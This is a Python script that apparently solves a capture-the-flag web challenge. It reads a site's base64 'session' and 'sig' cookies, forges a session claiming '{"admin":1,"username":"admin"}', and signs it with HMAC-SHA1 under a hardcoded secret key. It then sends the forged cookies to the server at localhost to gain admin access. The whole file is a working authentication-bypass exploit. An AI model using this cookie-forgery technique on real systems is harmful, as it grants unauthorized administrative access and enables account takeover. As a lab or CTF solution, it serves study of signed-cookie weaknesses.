import httpx
import asyncio
from base64 import b64encode, b64decode
from hashlib import sha1
import hmac
import requests

URL = 'http://localhost:8000'
KEY = '6lmao9'
class BaseAPI():
	def __init__(self,url=URL):
		self.c = httpx.AsyncClient(base_url=url)

	def visit(self):
		return self.c.get("/")

	def solve(self,cookies):
		return self.c.get("/",cookies=cookies)

class MakeSIG():
	def __init__(self, key=KEY):
		self.c = key

	def sign(self, m):
		return b64encode(hmac.new(self.c.encode(), m.encode(), sha1).digest()).decode()

class API(BaseAPI):
	...

async def main():
	api = API()
	solve = MakeSIG()
	res = await api.visit()
	cookie_session = b64decode(res.cookies['session'].encode()).decode()
	cookie_sig = b64decode(res.cookies['sig'].encode())
	wanted_session = '{"admin":1,"username":"admin"}'
	solve = solve.sign(wanted_session)
	cookies = {
	"session" : b64encode(wanted_session.encode()).decode(),
	"sig" : solve
	}
	# print(cookies)
	# solver = await api.solve(cookies)
	solver = requests.get(URL, cookies=cookies)
	print(solver.text)


if __name__ == '__main__':
	asyncio.run(main())